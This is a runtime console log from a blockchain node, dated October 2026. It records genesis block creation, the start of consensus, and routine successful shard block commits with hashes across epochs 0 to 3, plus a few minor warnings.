[0;32mINFO [0m[2026-10-06 22:02:10.065] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:10.066] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:10.410] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.518] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.519] [factory]            [0/0/0/]       AOT transaction selection enabled        [0;32mcacheSize[0m = 10 [0;32mselectionTimeoutMs[0m = 30000 
[0;32mINFO [0m[2026-10-06 22:02:10.547] [factory]            [0/0/0/]       indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 0 [0;32mhash[0m = 44c8ad7cae76622aec11467c2c08d55e08eb2168dc1f67baf8108e349e41732d 
[0;32mINFO [0m[2026-10-06 22:02:10.777] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.862] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:10.866] [state]              [0/0/0/]       could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.866] [factory]            [0/0/0/]       starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.868] [vmContainerFactory] [0/0/2/(START_ROUND)] VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.873] [node]               [0/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:10.969] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.037] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.043] [process/block]      [0/0/2/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 2 [0;32mnonce[0m = 1 [0;32mhash[0m = d5bdd96278b9dbd0f5207b2b83bc0f27043f074c125dc9070489f05efd7348aa 
[0;32mINFO [0m[2026-10-06 22:02:15.015] [process/block]      [0/0/3/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 3 [0;32mnonce[0m = 2 [0;32mhash[0m = 36586d5593d9fbb8f43f889cc78200efed240d8f77671bdb1deea97a72d82e04 
[0;32mINFO [0m[2026-10-06 22:02:21.013] [process/block]      [0/0/4/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 4 [0;32mnonce[0m = 3 [0;32mhash[0m = f7ab2e1fc0e18335e948b13fb3468942c4b09c2d6092eff80e8bd8b179528d67 
[0;32mINFO [0m[2026-10-06 22:02:27.015] [process/block]      [0/0/5/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 5 [0;32mnonce[0m = 4 [0;32mhash[0m = d3545a9a67a0580e3e8f9479a2a8f191a7bdaacddab847f05bedd76065626d3a 
[0;32mINFO [0m[2026-10-06 22:02:33.014] [process/block]      [0/0/6/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 6 [0;32mnonce[0m = 5 [0;32mhash[0m = 9d470069c6137fe2d43a3d458807089baeee6639c070592bff6255b1b46c7070 
[0;32mINFO [0m[2026-10-06 22:02:39.019] [process/block]      [0/0/7/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 7 [0;32mnonce[0m = 6 [0;32mhash[0m = 8022e0edb3f7b3a39cb074302123db3a9817edaa8d99bc51fb9f7e637143e54c 
[0;32mINFO [0m[2026-10-06 22:02:45.013] [process/block]      [0/0/8/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 8 [0;32mnonce[0m = 7 [0;32mhash[0m = 8458e3fdc458619cb5ab4abf4388ee5fbe81d6ec0479c9a4f69b2e5748bd16c1 
[0;32mINFO [0m[2026-10-06 22:02:51.018] [process/block]      [0/0/9/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 9 [0;32mnonce[0m = 8 [0;32mhash[0m = fcc9c238e3c0b8583d0ac32f3fc6d993d69408b046c35359d37fa2a7ba9920aa 
[0;32mINFO [0m[2026-10-06 22:02:57.015] [process/block]      [0/0/10/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 10 [0;32mnonce[0m = 9 [0;32mhash[0m = 3251be20e3a1430b0cb2aaf39abb7d6f68d4743b9bb63ae63b36464a7436fd57 
[0;32mINFO [0m[2026-10-06 22:03:03.014] [process/block]      [0/0/11/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 11 [0;32mnonce[0m = 10 [0;32mhash[0m = d7751e8c75702442ebebd173e134f3bbe2843dc6d63110283d529b518f58d818 
[0;32mINFO [0m[2026-10-06 22:03:09.020] [process/block]      [0/0/12/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 12 [0;32mnonce[0m = 11 [0;32mhash[0m = a5afdd224e6e20c412a9110259ad74fcf5a3cfb4af7bd55c831f847aa9971f6e 
[0;32mINFO [0m[2026-10-06 22:03:15.015] [process/block]      [0/0/13/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 13 [0;32mnonce[0m = 12 [0;32mhash[0m = 3f9e2b17674e22f6c44f9391142afe082368930b3f979a1b0a6ab1ff6db3a2dc 
[0;32mINFO [0m[2026-10-06 22:03:21.022] [process/block]      [0/0/14/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 14 [0;32mnonce[0m = 13 [0;32mhash[0m = 58ec9c87aabf474fee7c30fb5d1b83598bbaddfc16aedc73e089f415b5be7d7a 
[0;32mINFO [0m[2026-10-06 22:03:27.017] [process/block]      [0/0/15/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 15 [0;32mnonce[0m = 14 [0;32mhash[0m = da363faaef0e970e4a6f0dff6ae4902d014556b192495b8ad4c7e66dcd56fea3 
[0;32mINFO [0m[2026-10-06 22:03:33.025] [process/block]      [0/0/16/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 16 [0;32mnonce[0m = 15 [0;32mhash[0m = cc0a413ba2c205daf2a926df638df38d865b29aa5bb5e544e62658874ece68e7 
[0;32mINFO [0m[2026-10-06 22:03:39.017] [process/block]      [0/0/17/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 17 [0;32mnonce[0m = 16 [0;32mhash[0m = 7a1fca6d7e7d454798cbc4da4b88665dac5b4afeb426b5d67299f63157e79567 
[0;32mINFO [0m[2026-10-06 22:03:45.018] [process/block]      [0/0/18/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 18 [0;32mnonce[0m = 17 [0;32mhash[0m = a24bcbbb118cca329fe797216f78d8ed81cb5f67460e5a8e08104ad47d1ed483 
[0;32mINFO [0m[2026-10-06 22:03:51.025] [process/block]      [0/0/19/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 19 [0;32mnonce[0m = 18 [0;32mhash[0m = 1d440629ecaab36c1d1995c866f4525fab933d4933c0abb50eee4664c42251ce 
[0;32mINFO [0m[2026-10-06 22:03:57.017] [process/block]      [0/0/20/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 20 [0;32mnonce[0m = 19 [0;32mhash[0m = d5edaee92782c5150a9e8a5bcf9d59077440de006d3446df18f039f115e05fc1 
[0;32mINFO [0m[2026-10-06 22:04:03.021] [process/block]      [0/0/21/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 21 [0;32mnonce[0m = 20 [0;32mhash[0m = e88f671ee60e08ecf0471ca0b7411370ecd0b70cc58ad88b9862be9cd3dcb3a1 
[0;32mINFO [0m[2026-10-06 22:04:09.014] [process/block]      [0/0/22/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 22 [0;32mnonce[0m = 21 [0;32mhash[0m = 5f6dd2ec590bcaa8bb39195e9bd4794405995ad00d0092516217692c88243d6c 
[0;32mINFO [0m[2026-10-06 22:04:15.017] [process/block]      [0/0/23/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 23 [0;32mnonce[0m = 22 [0;32mhash[0m = 18578d86977b586cbce97167926e717ded597fb2230d2bceb4f2dfabf63a8b60 
[0;32mINFO [0m[2026-10-06 22:04:21.015] [process/block]      [0/0/24/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 24 [0;32mnonce[0m = 23 [0;32mhash[0m = 18bd49d3bbda56fe4e5564ae770d51511fda48a83dd39feb84d7ce77fd7ff9ab 
[0;32mINFO [0m[2026-10-06 22:04:27.012] [process/block]      [0/0/25/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 25 [0;32mnonce[0m = 24 [0;32mhash[0m = 34a7ea4de92180120f258f31622f7ea73777251a1aaa88b6ca06193d214e50cb 
[0;32mINFO [0m[2026-10-06 22:04:33.015] [process/block]      [0/0/26/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 26 [0;32mnonce[0m = 25 [0;32mhash[0m = 579e849de660393f9617fd08724e0bc658fa49c9607bc009ab625706d5279eca 
[0;32mINFO [0m[2026-10-06 22:04:39.006] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:39.008] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:49.909] [process/block]      [0/1/28/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 28 [0;32mnonce[0m = 26 [0;32mhash[0m = f9c7d6f5851cd6f918d56c686bb639c5371f3c457f4a972b637c72d0b814e166 
[0;32mINFO [0m[2026-10-06 22:04:49.913] [state]              [0/1/28/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 [0;32mepoch[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:51.024] [process/block]      [0/1/29/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 29 [0;32mnonce[0m = 27 [0;32mhash[0m = d72db60a3ba3f76f2e43bd6f2671a89840e19b8eb399aacdc337926acbbdb0de 
[0;32mINFO [0m[2026-10-06 22:04:57.021] [process/block]      [0/1/30/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 30 [0;32mnonce[0m = 28 [0;32mhash[0m = d41b91c520c1a19432fda0bdd0ff5a20b52d27bb744a67f219059a88d257ad6f 
[0;32mINFO [0m[2026-10-06 22:05:03.019] [process/block]      [0/1/31/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 31 [0;32mnonce[0m = 29 [0;32mhash[0m = e097f2f6af1a03acf564fd1db08a79de52cf21a1b3304c3e605d7cf199f7d8e3 
[0;32mINFO [0m[2026-10-06 22:05:09.018] [process/block]      [0/1/32/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 32 [0;32mnonce[0m = 30 [0;32mhash[0m = b30735c1b534124f21adaa8cb55ff08e9ae5dcc0ab664c0b59326eb30fe2ae29 
[0;32mINFO [0m[2026-10-06 22:05:24.258] [process/block]      [0/1/34/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 33 [0;32mnonce[0m = 31 [0;32mhash[0m = 26ee8731261ba47e54827e21ee512223dbc3d34c6fd4d3fb2b1994b3c3b609b7 
[0;32mINFO [0m[2026-10-06 22:05:24.267] [process/block]      [0/1/34/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 34 [0;32mnonce[0m = 32 [0;32mhash[0m = fad1e91ddfbe5276917e94129538fb7e0bb4773f7fef1b90670d6b2a09acae4d 
[0;32mINFO [0m[2026-10-06 22:05:27.023] [process/block]      [0/1/35/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 35 [0;32mnonce[0m = 33 [0;32mhash[0m = f5341383ffa39c91eec82579b5ff574f85b51d3ddc580fb8199e0a1536637e12 
[0;32mINFO [0m[2026-10-06 22:05:39.824] [process/block]      [0/1/37/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 36 [0;32mnonce[0m = 34 [0;32mhash[0m = 61ea7b42c995e12be99bd59668db8f48b449216f05ef8a7f5b91a9a9c3b2fd79 
[0;32mINFO [0m[2026-10-06 22:05:39.836] [process/block]      [0/1/37/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 37 [0;32mnonce[0m = 35 [0;32mhash[0m = a3e5c96e7d34fc453e171c92ba4ee5559674951d6d77dd77885fee512599f613 
[0;32mINFO [0m[2026-10-06 22:05:51.008] [process/block]      [0/1/39/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 38 [0;32mnonce[0m = 36 [0;32mhash[0m = cd6646c16b5d7b2f1c881b600412c4921ca59a7b400227a7b8c81bec5a360fc0 
[0;32mINFO [0m[2026-10-06 22:05:51.027] [process/block]      [0/1/39/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 39 [0;32mnonce[0m = 37 [0;32mhash[0m = 85471babb00c8eaed4f1b0863d262b337b72a43c1c0a8c9cb7ec299c8da44da5 
[0;32mINFO [0m[2026-10-06 22:05:57.028] [process/block]      [0/1/40/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 40 [0;32mnonce[0m = 38 [0;32mhash[0m = 3a4c5a6fdc068112bc997093d2145763fd9f979132d6b208b439d18e44d056d6 
[0;32mINFO [0m[2026-10-06 22:06:03.025] [process/block]      [0/1/41/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 41 [0;32mnonce[0m = 39 [0;32mhash[0m = 7be317ad062b3ee2e48b6f3cac5a5081936ffec302ca083dda1da1182539c5a1 
[0;32mINFO [0m[2026-10-06 22:06:18.006] [process/block]      [0/1/43/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 43 [0;32mnonce[0m = 40 [0;32mhash[0m = 62ade4e48f729a692e13c9707173bf008d42e7337630fe0ad0e8a21ffd695047 
[0;32mINFO [0m[2026-10-06 22:06:21.037] [process/block]      [0/1/44/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 44 [0;32mnonce[0m = 41 [0;32mhash[0m = b24399f37dff235d8252e514d4c6d94dc10a0f6b2dbcb0c3264bea9c1fbc47f3 
[0;32mINFO [0m[2026-10-06 22:06:33.412] [process/block]      [0/1/46/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 45 [0;32mnonce[0m = 42 [0;32mhash[0m = ac6ea7dba63d2ca816bc09e57aa56beda2fc89c311681cf8d6572c5f19410be1 
[0;32mINFO [0m[2026-10-06 22:06:33.419] [process/block]      [0/1/46/(START_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 46 [0;32mnonce[0m = 43 [0;32mhash[0m = 8036e413b7f84717e241205304b6967a6b42372145db3574b49a3fdd8f69d415 
[0;32mINFO [0m[2026-10-06 22:06:39.020] [process/block]      [0/1/47/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 47 [0;32mnonce[0m = 44 [0;32mhash[0m = d433f3c0bdfb6977a790d1d3ba60abf059e18a00f120f0ea3af009c590ffcc1a 
[0;32mINFO [0m[2026-10-06 22:06:45.025] [process/block]      [0/1/48/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 48 [0;32mnonce[0m = 45 [0;32mhash[0m = 8d284ab63355d3fdc06361b7373d055ea9b0a8b8f7725c20e3db60e136e2cb48 
[0;32mINFO [0m[2026-10-06 22:06:51.025] [process/block]      [0/1/49/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 49 [0;32mnonce[0m = 46 [0;32mhash[0m = cc29082633c650dd24e6a36d6c27b67b25c15c39f5a4284a8efebf8437d83c98 
[0;32mINFO [0m[2026-10-06 22:06:57.023] [process/block]      [0/1/50/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 50 [0;32mnonce[0m = 47 [0;32mhash[0m = f93f78d1b87acffc2b890caf5f53e20d5b9478086b85d7cf1897fdb507127622 
[0;32mINFO [0m[2026-10-06 22:07:03.023] [process/block]      [0/1/51/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 51 [0;32mnonce[0m = 48 [0;32mhash[0m = 754796a81a99a5e8b504cee5e13aa086f9156c4ddc472380caf32c1d1f05c408 
[0;32mINFO [0m[2026-10-06 22:07:09.002] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:07:09.003] [processProxy]       [0/2/52/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;33mWARN [0m[2026-10-06 22:07:10.160] [process/block]      [0/2/52/(END_ROUND)] saveBody                                 [0;33melapsed time[0m = 1.138887s 
[0;32mINFO [0m[2026-10-06 22:07:10.983] [process/block]      [0/2/52/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 52 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 
[0;32mINFO [0m[2026-10-06 22:07:10.994] [state]              [0/2/52/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = a518a5c28291a61b129dfd908f2492adb0ac4f9425d9adc0fc072e39a59d2f0f [0;32mepoch[0m = 2 
[0;32mINFO [0m[2026-10-06 22:07:11.002] [process/block]      [0/2/52/(END_ROUND)] supernova transition is ready            [0;32mshard[0m = 0 [0;32mnonce[0m = 49 [0;32mhash[0m = 2eeb4c93b92261f08f33f8ec3a4858e6f1e84d60d6ea643d77e031e15849f202 [0;32mepoch[0m = 2 [0;32mround[0m = 52 
[0;32mINFO [0m[2026-10-06 22:07:15.021] [process/block]      [0/2/53/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 53 [0;32mnonce[0m = 50 [0;32mhash[0m = 9e424fc756e7d48ac81bdc19a20824f6b38d2e53626e8475dd85a434399f9038 
[0;32mINFO [0m[2026-10-06 22:07:21.030] [process/block]      [0/2/54/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 54 [0;32mnonce[0m = 51 [0;32mhash[0m = 3538b19ce9ad03d99f8060ef759ea1fa32ac6982c50eda20cd2c67934e5336bc 
[0;32mINFO [0m[2026-10-06 22:07:27.020] [process/block]      [0/2/55/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 55 [0;32mnonce[0m = 52 [0;32mhash[0m = 68ec1297b966cacb680bb988ac42effa38afc9e580d72983b7006489825a80a2 
[0;32mINFO [0m[2026-10-06 22:07:33.018] [process/block]      [0/2/56/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 56 [0;32mnonce[0m = 53 [0;32mhash[0m = 608cd4a284caca7ddf70cb5e0aea914c3aa0fbc605d87601a06f834f221685ec 
[0;32mINFO [0m[2026-10-06 22:07:39.019] [process/block]      [0/2/57/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 57 [0;32mnonce[0m = 54 [0;32mhash[0m = 2131c5a99673d22dce03747566dc2288270ae224aa36d26002e94d843ee62900 
[0;32mINFO [0m[2026-10-06 22:07:45.015] [process/block]      [0/2/58/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 58 [0;32mnonce[0m = 55 [0;32mhash[0m = a68386bda3d914aef78d1a30b51f4f717c75debbf65123a4e1c1a5cf425b9e77 
[0;32mINFO [0m[2026-10-06 22:07:51.014] [process/block]      [0/2/59/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 59 [0;32mnonce[0m = 56 [0;32mhash[0m = 7465bca05cad5d9424100c1425e0d53a0d9b2087a6bd0a4cdae7d949344b615d 
[0;32mINFO [0m[2026-10-06 22:07:57.019] [process/block]      [0/2/60/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 60 [0;32mnonce[0m = 57 [0;32mhash[0m = 57bfb935e64a756d45fb2e73d6172214a9fc6e2389737ecb2b0307c230151a14 
[0;32mINFO [0m[2026-10-06 22:08:03.019] [process/block]      [0/2/61/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 61 [0;32mnonce[0m = 58 [0;32mhash[0m = 71ff11a30aeb99162b207422b686d39d592699393155419997acfe39c561d4ed 
[0;32mINFO [0m[2026-10-06 22:08:09.017] [process/block]      [0/2/62/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 62 [0;32mnonce[0m = 59 [0;32mhash[0m = 34cbab52b6d4fbf1890efdc4074c007fdb3003826d8d16b98d7ba813baff3283 
[0;32mINFO [0m[2026-10-06 22:08:15.021] [process/block]      [0/2/63/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 63 [0;32mnonce[0m = 60 [0;32mhash[0m = 76a498ab7fc288982a6baa46f37d7f03644c420ad3d78be1ab4c8bd19df3417b 
[0;32mINFO [0m[2026-10-06 22:08:21.021] [process/block]      [0/2/64/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 64 [0;32mnonce[0m = 61 [0;32mhash[0m = f29bc614ab9bd58f8296f8dbe120dbe4fe8bbd3dc5dad4447e3252e450d917ec 
[0;32mINFO [0m[2026-10-06 22:08:27.016] [process/block]      [0/2/65/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 65 [0;32mnonce[0m = 62 [0;32mhash[0m = b9391d22672c7a2cb7083724286af774240bb58ac76abd635919365a63ea2b54 
[0;32mINFO [0m[2026-10-06 22:08:33.019] [process/block]      [0/2/66/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 66 [0;32mnonce[0m = 63 [0;32mhash[0m = bbd7c3bc2aafef38f22ba7338751b538de4aeae7118e536abca571f7eabcf462 
[0;32mINFO [0m[2026-10-06 22:08:39.018] [process/block]      [0/2/67/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 67 [0;32mnonce[0m = 64 [0;32mhash[0m = a4ab9a89a9ecd6c5ca3a95d458f27aedf481a75e7317e65d269081be621ba6d8 
[0;32mINFO [0m[2026-10-06 22:08:45.017] [process/block]      [0/2/68/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 68 [0;32mnonce[0m = 65 [0;32mhash[0m = 83cc45fe52ff0e0de000064eb406bf8af0291a3a1c96ea10eaed31d3fce15e89 
[0;32mINFO [0m[2026-10-06 22:08:51.021] [process/block]      [0/2/69/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 69 [0;32mnonce[0m = 66 [0;32mhash[0m = f7cd5d533d860982fd22ad45a10a44aaaaa8c3d318630338217975fc0f107f54 
[0;32mINFO [0m[2026-10-06 22:08:57.019] [process/block]      [0/2/70/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 70 [0;32mnonce[0m = 67 [0;32mhash[0m = 0d49f5ea35b970b6af2479b7f617ac6ba705d0348bbfb5444c60618ed6031b24 
[0;32mINFO [0m[2026-10-06 22:09:03.018] [process/block]      [0/2/71/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 71 [0;32mnonce[0m = 68 [0;32mhash[0m = cab0dddfc0c54296efd10e3a6c768cf65e05a014bc7450a70427319a866926ae 
[0;32mINFO [0m[2026-10-06 22:09:09.020] [process/block]      [0/2/72/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 72 [0;32mnonce[0m = 69 [0;32mhash[0m = 0429c42bc61394cd44582550a68a72aaf0044e68de9923f8a11805294f983902 
[0;32mINFO [0m[2026-10-06 22:09:15.027] [process/block]      [0/2/73/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 73 [0;32mnonce[0m = 70 [0;32mhash[0m = 56aa8b0eeabdcd5e07003e9e20f023f8a2153d47d2cc8081468675415d717117 
[0;32mINFO [0m[2026-10-06 22:09:24.021] [process/block]      [0/3/74/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 2 [0;32mshard[0m = 0 [0;32mround[0m = 74 [0;32mnonce[0m = 71 [0;32mhash[0m = acc0c67794d94f46df340547791ce1e9da2a46a07c24399227474395832153a2 
[0;32mINFO [0m[2026-10-06 22:09:27.021] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:27.021] [processProxy]       [0/3/75/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:09:29.079] [process/block]      [0/3/75/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 75 [0;32mnonce[0m = 72 [0;32mhash[0m = e2f6bf4c84964ab371ac13f754590222a029382e7c4583ce2b1f12d358af2244 
[0;32mINFO [0m[2026-10-06 22:09:29.083] [state]              [0/3/75/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 2c473afb8c885d35d627983af2acb0bae6723a2099552c9bc2fb362441561d56 [0;32mepoch[0m = 3 
[0;32mINFO [0m[2026-10-06 22:09:33.020] [process/block]      [0/3/76/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 76 [0;32mnonce[0m = 73 [0;32mhash[0m = 03320edef061391af970a7278631dba85bcb8cdc1976a6d6610b7d77a0e85b0a 
[0;32mINFO [0m[2026-10-06 22:09:39.017] [process/block]      [0/3/77/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 77 [0;32mnonce[0m = 74 [0;32mhash[0m = a9b39869efb6b21d31131ffdf6b10983f3a8a1942fd299473a751ae9c1e8b32b 
